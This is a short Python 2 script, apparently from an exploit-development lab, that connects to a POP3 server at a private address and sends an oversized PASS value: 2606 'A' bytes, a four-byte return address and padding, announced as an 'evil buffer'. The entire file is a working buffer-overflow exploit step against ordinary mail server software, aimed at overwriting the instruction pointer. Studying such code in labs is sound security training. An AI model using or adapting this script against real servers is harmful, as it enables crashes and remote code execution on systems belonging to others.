#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
buffer = "A" * 2606 + "\xe3\x41\x4b\x5f" + "C" * 390
try:
    print "\nSending evil buffer..."
    s.connect(("192.168.1.110",110))
    data = s.recv(1024)
    print data
    s.send("USER test"+"\r\n")
    data = s.recv(1024)
    print data
    s.send("PASS " + buffer + "\r\n")
    print "\nDone"
    
except:
    print "Could not connect to POP3!"
